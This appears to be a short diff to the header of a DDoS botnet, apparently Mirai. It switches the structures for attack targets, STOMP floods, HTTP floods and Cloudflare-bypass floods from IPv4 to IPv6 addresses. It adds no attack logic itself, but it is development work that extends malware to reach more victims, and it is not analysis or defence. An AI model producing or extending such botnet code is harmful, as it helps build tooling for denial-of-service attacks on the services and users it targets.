@@ -18,8 +18,8 @@
 #endif
 
 struct attack_target {
-    struct sockaddr_in sock_addr;
-    ipv4_t addr;
+    struct sockaddr_in6 sock_addr;
+    struct in6_addr addr;
     uint8_t netmask;
 };
 
@@ -76,7 +76,7 @@ struct attack_method {
 };
 
 struct attack_stomp_data {
-    ipv4_t addr;
+    struct in6_addr addr;
     uint32_t seq, ack_seq;
     port_t sport, dport;
 };
@@ -110,7 +110,7 @@ struct attack_http_state {
     uint8_t state;
     int last_recv;
     int last_send;
-    ipv4_t dst_addr;
+    struct in6_addr dst_addr;
     char user_agent[512];
     char path[HTTP_PATH_MAX + 1];
     char domain[HTTP_DOMAIN_MAX + 1];
@@ -136,7 +136,7 @@ struct attack_cfnull_state {
     uint8_t state;
     int last_recv;
     int last_send;
-    ipv4_t dst_addr;
+    struct in6_addr dst_addr;
     char user_agent[512];
     char domain[HTTP_DOMAIN_MAX + 1];
     int to_send;
